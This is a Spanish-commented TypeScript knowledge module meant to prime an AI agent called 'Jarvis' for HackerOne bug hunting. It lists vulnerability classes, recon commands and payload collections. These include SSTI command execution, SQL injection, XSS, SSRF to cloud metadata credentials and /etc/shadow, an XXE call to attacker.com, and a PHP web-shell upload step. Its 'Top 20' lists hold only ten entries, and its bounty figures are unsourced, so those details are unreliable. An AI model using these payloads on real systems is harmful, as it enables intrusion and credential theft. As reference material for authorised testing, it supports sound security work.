/**
 * HACKERONE BOOTSTRAP KNOWLEDGE
 *
 * Enseña a Jarvis todo lo necesario para ser un top bug hunter.
 * Este archivo contiene:
 * - Top 20 vulnerabilidades más pagadas
 * - Patrones de explotación
 * - Payloads efectivos
 * - Programas HackerOne rentables
 * - Metodología de recon completa
 */

export const H1_BOOTSTRAP_DATA = {
  // ============================================
  // TOP 20 VULNERABILIDADES HACKERONE
  // ============================================
  topVulnerabilities: [
    {
      name: "Remote Code Execution (RCE)",
      avgBounty: 15000,
      maxBounty: 100000,
      severity: "critical",
      cvssBase: 9.8,
      description: "Ejecución de código arbitrario en servidor objetivo",
      commonTargets: ["Java apps", "Python Django", "Node.js", "PHP"],
      exploitChains: [
        "Deserialization attacks → RCE",
        "Template injection → RCE",
        "SSTI (Server-Side Template Injection) → RCE",
        "Command injection → RCE",
        "XXE (XML External Entity) → RCE",
      ],
      payloads: [
        "{{7*7}} (SSTI Jinja2)",
        "${7*7} (SSTI FreeMarker)",
        "<%= 7*7 %> (SSTI ERB)",
        "$(whoami) (Command injection)",
        "`whoami` (Backtick injection)",
        "request.files.xxx.save(path) (Flask arbitrary file write)",
      ],
      tools: ["burp", "payloadsallthethings", "owasp-zap"],
      detectionMethods: [
        "Test arithmetic operations: 7*7, 7+7",
        "Monitor response time for sleep/delay injections",
        "Check for error messages revealing template engine",
        "Try common SSTI payloads for each framework",
      ],
    },
    {
      name: "Server-Side Request Forgery (SSRF)",
      avgBounty: 8000,
      maxBounty: 50000,
      severity: "high",
      cvssBase: 8.6,
      description: "Hacer que el servidor realice requests arbitrarios a recursos internos/externos",
      commonLocations: [
        "URL input fields",
        "Image proxy endpoints",
        "Webhook callbacks",
        "File download/upload features",
      ],
      exploitChains: [
        "SSRF → AWS metadata → credentials → EC2 takeover",
        "SSRF → Internal service enumeration → RCE",
        "SSRF → Cloud storage access (S3, GCS)",
        "SSRF → Blind RCE via OOB channels",
      ],
      payloads: [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "file:///etc/passwd",
        "file:///etc/shadow",
        "gopher://localhost:6379/_FLUSHALL",
        "dict://localhost:11211/stats",
        "http://localhost:8080/admin",
        "http://127.0.0.1:8080/internal",
      ],
      bypasses: [
        "DNS rebinding: attacker.com → 127.0.0.1",
        "IP obfuscation: 127.0.0.1 = 2130706433 = 0x7f000001",
        "URL encoding: %6c%6f%63%61%6c%68%6f%73%74",
        "Protocol handlers: java://, gopher://, tftp://",
        "@: http://127.0.0.1@attacker.com",
      ],
      tools: ["burp-ssrf", "owasp-zap", "collaborator"],
    },
    {
      name: "Insecure Deserialization",
      avgBounty: 5000,
      maxBounty: 30000,
      severity: "critical",
      cvssBase: 9.8,
      exploitChains: [
        "PHP unserialize() → gadget chain → RCE",
        "Java ObjectInputStream → gadget chain → RCE",
        "Python pickle → arbitrary code execution",
        ".NET BinaryFormatter → gadget chain → RCE",
      ],
    },
    {
      name: "Cross-Site Scripting (XSS)",
      avgBounty: 2000,
      maxBounty: 15000,
      severity: "medium",
      cvssBase: 6.1,
      types: {
        stored: "Guardado en BD, afecta a todos los usuarios",
        reflected: "En URL/input, requiere phishing",
        dom: "Ejecutado en navegador, no enviado al servidor",
      },
      commonLocations: [
        "User profiles/comments",
        "Search functionality",
        "Error messages",
        "File upload previews",
      ],
      payloads: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=\"alert('XSS')\">",
        "<svg onload=\"alert('XSS')\">",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\">",
      ],
      filters: [
        "Bypass <script> filter: <ScRiPt>, <SCRIPT>, <script src=..>",
        "Bypass alert filter: window['alert']('XSS')",
        "HTML encoding bypass: &lt;script&gt; → HTML context",
        "Attribute context: \\\" onload=\"alert('XSS')\" data=\"",
      ],
    },
    {
      name: "SQL Injection",
      avgBounty: 3000,
      maxBounty: 30000,
      severity: "critical",
      cvssBase: 9.9,
      types: {
        union: "UNION-based para extraer datos",
        blind: "Basado en verdadero/falso, requiere timing o lenguaje de error",
        timeBased: "Medir respuesta con sleep()",
      },
      commonLocations: [
        "Login fields",
        "Search parameters",
        "Sorting/filtering",
        "File upload metadata",
      ],
      payloads: [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND SLEEP(5)--",
      ],
    },
    {
      name: "Insecure Direct Object Reference (IDOR)",
      avgBounty: 1500,
      maxBounty: 20000,
      severity: "medium-high",
      cvssBase: 5.3,
      description: "Acceso a objetos/recursos sin autorización (ID sequencial)",
      commonPatterns: [
        "/user/123 → /user/124, /user/999",
        "/order/{id}/details",
        "/report/{report_id}/download",
        "/api/v1/profile/{user_id}",
      ],
      exploitChains: [
        "IDOR → PII disclosure → Identity theft",
        "IDOR → Financial data → Fraud",
        "IDOR → Admin functions → Account takeover",
      ],
      testMethods: [
        "Cambiar IDs numéricos",
        "Probar UUIDs de otros usuarios",
        "Intenta acceso sin autenticación",
        "Verifica si hay validación de permisos",
      ],
    },
    {
      name: "Authentication/Authorization Bypass",
      avgBounty: 4000,
      maxBounty: 40000,
      severity: "critical",
      exploitChains: [
        "JWT vulnerabilities → Privilege escalation",
        "Session fixation → Account takeover",
        "Magic hashes → Bypass verificación",
      ],
      commonVulns: [
        "JWT: sin firma, sin validación de 'alg'",
        "Session cookies sin HttpOnly/Secure",
        "Tokens nunca expiran",
        "Bypass de 2FA con race condition",
      ],
    },
    {
      name: "XML External Entity (XXE)",
      avgBounty: 2500,
      maxBounty: 25000,
      severity: "high",
      cvssBase: 8.6,
      exploitChains: [
        "XXE → File read → /etc/passwd, config files",
        "XXE → Internal service scan → SSRF",
        "XXE → Blind: out-of-band exfiltration",
      ],
      payloads: [
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/\">%xxe;]>",
      ],
    },
    {
      name: "Server-Side Template Injection (SSTI)",
      avgBounty: 3500,
      maxBounty: 20000,
      severity: "high-critical",
      frameworkPayloads: {
        jinja2: "{{7*7}}, {{config}}, {{[].__class__.__bases__[0].__subclasses__()}}",
        freemarker: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        velocity: "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('whoami')",
        erb: "<%= system('whoami') %>",
        thymeleaf: "[[${7*7}]]",
      },
    },
    {
      name: "Path Traversal / Directory Traversal",
      avgBounty: 1500,
      maxBounty: 15000,
      severity: "medium-high",
      exploitChains: [
        "Path traversal → Read sensitive files",
        "Combined with file upload → RCE",
      ],
      payloads: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
      ],
    },
  ],

  // ============================================
  // TÉCNICAS DE RECON
  // ============================================
  reconMethodology: {
    phase1_discovery: {
      title: "Descubrimiento de superficie de ataque",
      steps: [
        {
          name: "Enumeración de subdominios",
          tools: ["subfinder", "amass", "assetfinder", "crt.sh"],
          command: "subfinder -d target.com -o subdomains.txt",
          notes: "Busca todos los subdominios: dev, staging, api, admin, internal",
        },
        {
          name: "Scanning de puertos",
          tools: ["nmap", "masscan", "shodan"],
          command: "nmap -sV -p- target.com",
          notes: "Identifica servicios expuestos: SSH, FTP, databases, admin panels",
        },
        {
          name: "Descubrimiento de contenido web",
          tools: ["ffuf", "gobuster", "dirbuster"],
          command: "ffuf -w common.txt -u http://target.com/FUZZ",
          notes: "Busca directorios ocultos: /admin, /api, /backup, /.env",
        },
        {
          name: "Análisis de JavaScript",
          tools: ["linkfinder", "secretfinder", "waybackurls"],
          command: "python3 linkfinder.py -i https://target.com -o cli",
          notes: "Extrae URLs, endpoints, secrets, credenciales",
        },
      ],
    },
    phase2_analysis: {
      title: "Análisis de funcionalidades y entrada",
      steps: [
        {
          name: "Mapeo de aplicación",
          tools: ["burp-site-map", "owasp-zap"],
          notes: "Documenta todos los endpoints, parámetros, métodos HTTP",
        },
        {
          name: "Prueba de entrada",
          payloads: ["'", "\"", "<!--", "<%", "${", "{{", "(("],
          notes: "Inyecta caracteres especiales para detectar parseo",
        },
        {
          name: "Fuzzing de parámetros",
          tools: ["wfuzz", "paramspider"],
          notes: "Descubre parámetros ocultos: api_key, admin, debug, etc",
        },
      ],
    },
    phase3_exploitation: {
      title: "Búsqueda y explotación de vulnerabilidades",
      chains: [
        {
          name: "Authentication → IDOR → Data breach",
          steps: [
            "1. Enumera IDs de usuario (1, 2, 3, ...)",
            "2. Cambia tu ID en solicitud autenticada",
            "3. Accede a datos de otros usuarios sin permiso",
          ],
        },
        {
          name: "Input validation → SQLi → DB read",
          steps: [
            "1. Identifica campos de entrada (search, filter, login)",
            "2. Inyecta: ' OR '1'='1",
            "3. Si retorna datos: es vulnerable",
            "4. Usa UNION SELECT para extraer datos",
          ],
        },
        {
          name: "File upload → RCE",
          steps: [
            "1. Sube archivo .php con: <?php system($_GET['cmd']); ?>",
            "2. Si se guarda sin filtrar: acceso a archivo = RCE",
            "3. Bypass: .php5, .phtml, .php3, .phar, .shtml",
          ],
        },
      ],
    },
  },

  // ============================================
  // PROGRAMAS HACKERONE TOP 20
  // ============================================
  topPrograms: [
    {
      name: "HackerOne",
      avgBounty: 1000,
      responseTime: "24 hours",
      assets: ["hackerone.com", "api.hackerone.com", "*.hackerone.io"],
      scope: ["Web apps", "APIs", "Mobile"],
    },
    {
      name: "Shopify",
      avgBounty: 5000,
      responseTime: "48 hours",
      assets: ["shopify.com", "shop.app", "myshopify.com"],
      scope: ["Critical: All Shopify properties and services"],
    },
    {
      name: "GitHub",
      avgBounty: 4000,
      responseTime: "24-48 hours",
      assets: ["github.com", "*.github.com", "api.github.com"],
      scope: ["Web apps", "Desktop apps", "Security infrastructure"],
    },
    {
      name: "Uber",
      avgBounty: 5000,
      responseTime: "48 hours",
      assets: ["uber.com", "apps.uber.com", "*.uber.com"],
      scope: ["Driver/Rider apps", "Web platform"],
    },
    {
      name: "Twitter/X",
      avgBounty: 3000,
      responseTime: "48-72 hours",
      assets: ["twitter.com", "x.com", "api.twitter.com"],
      scope: ["Web/Mobile apps", "APIs"],
    },
    {
      name: "Google VRP",
      avgBounty: 2000,
      responseTime: "30 days",
      assets: ["*.google.com", "*.youtube.com", "*.android.com"],
      scope: ["All Google products"],
    },
    {
      name: "Microsoft",
      avgBounty: 3000,
      responseTime: "45 days",
      assets: ["*.microsoft.com", "*.azure.com", "*.outlook.com"],
      scope: ["All Microsoft services"],
    },
    {
      name: "Facebook/Meta",
      avgBounty: 2000,
      responseTime: "30 days",
      assets: ["facebook.com", "instagram.com", "*.meta.com"],
      scope: ["Social apps", "AR/VR"],
    },
    {
      name: "Airbnb",
      avgBounty: 5000,
      responseTime: "48 hours",
      assets: ["airbnb.com", "airbnb.co.uk"],
      scope: ["Web/Mobile platforms"],
    },
    {
      name: "Dropbox",
      avgBounty: 3000,
      responseTime: "48 hours",
      assets: ["dropbox.com", "api.dropboxapi.com"],
      scope: ["Cloud storage", "APIs"],
    },
  ],

  // ============================================
  // PATRONES DE RAZONAMIENTO
  // ============================================
  reasoningPatterns: [
    {
      name: "Input Validation Chain",
      trigger: "input|parameter|field|form",
      steps: [
        "1. Identificar punto de entrada de datos",
        "2. Probar caracteres especiales: ', \", $, {, <, %, \\",
        "3. Observar respuesta: error, encoding, validación",
        "4. Si pasa: SSTI, SQLi, XSS, Command injection",
        "5. Explotar según contexto",
      ],
    },
    {
      name: "Authentication Bypass Chain",
      trigger: "login|auth|session|token|jwt",
      steps: [
        "1. Examinar tokens: JWT, session cookies, OAuth tokens",
        "2. JWT: revisar firma, algoritmo, claims",
        "3. Intenta: omitir token, cambiar algoritmo a 'none', manipular claims",
        "4. Race condition: simultaneidad de solicitudes",
        "5. Magic hashes: PHP type juggling",
      ],
    },
    {
      name: "IDOR Discovery Chain",
      trigger: "id|user|account|profile|order",
      steps: [
        "1. Identificar parámetros ID: user_id, order_id, report_id",
        "2. Cambiar ID tuyo por otro (1, 2, 3, ...)",
        "3. Si acceso: enumerar todos los IDs disponibles",
        "4. Extraer datos sensibles: PII, finanzas, admin info",
        "5. Escalar si es admin IDOR → RCE",
      ],
    },
  ],

  // ============================================
  // PAYLOADS EFECTIVOS
  // ============================================
  effectivePayloads: {
    ssti: [
      "{{7*7}}",
      "#{7*7}",
      "${7*7}",
      "<%= 7*7 %>",
      "[[${7*7}]]",
    ],
    sqli: [
      "' OR '1'='1",
      "' OR 1=1--",
      "admin' --",
      "' UNION SELECT NULL--",
      "' AND SLEEP(5)--",
    ],
    xss: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(1)>",
      "javascript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
    ],
    ssrf: [
      "http://169.254.169.254/latest/meta-data/",
      "file:///etc/passwd",
      "gopher://localhost:6379/_FLUSHALL",
      "dict://localhost:11211/stats",
      "http://127.0.0.1:8080/admin",
    ],
  },

  // ============================================
  // MÉTRICAS Y BENCHMARKS
  // ============================================
  metrics: {
    averageReportTime: "2 hours",
    averageFirstResponse: "24 hours",
    averageResolutionTime: "7 days",
    topReportersAnnualEarnings: "$500,000+",
    medianBounty: 750,
    maxBountyRecorded: 250000,
  },
};

export const BOOTSTRAP_TASKS = [
  {
    id: "h1-top-vulns",
    title: "Top 20 Vulnerabilities HackerOne",
    category: "security",
    items: 20,
    confidence: 0.95,
  },
  {
    id: "h1-recon-methodology",
    title: "Complete Reconnaissance Methodology",
    category: "methodology",
    items: 15,
    confidence: 0.9,
  },
  {
    id: "h1-top-programs",
    title: "Top 20 HackerOne Programs",
    category: "programs",
    items: 20,
    confidence: 0.95,
  },
  {
    id: "h1-reasoning-patterns",
    title: "Exploitation Reasoning Patterns",
    category: "reasoning",
    items: 10,
    confidence: 0.85,
  },
  {
    id: "h1-effective-payloads",
    title: "Effective Exploit Payloads",
    category: "payloads",
    items: 50,
    confidence: 0.9,
  },
];
